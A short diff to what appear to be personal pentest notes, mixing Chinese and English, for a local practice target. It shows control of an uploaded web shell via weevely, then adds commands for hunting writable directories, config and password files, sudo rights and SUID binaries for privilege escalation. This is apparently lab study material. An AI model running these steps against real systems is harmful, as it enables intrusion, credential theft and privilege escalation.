@@ -168,5 +168,14 @@ control the webshell
 
 weevely http://localhost:8080/hackable/uploads/shell.php 123456
 
+2. 查看可寫入目錄
+find / -writable -type d 2>/dev/null
 
+3️. 搜尋敏感檔案（密碼、設定）
+find / -name "*.conf" 2>/dev/null
+find / -name "*config*" 2>/dev/null
 
+🔥 A. 查看 sudo 權限（大部分容器不會給）
+sudo -l
+🔥 B. 查看 SUID binary（重要提權點）
+find / -perm -4000 2>/dev/null
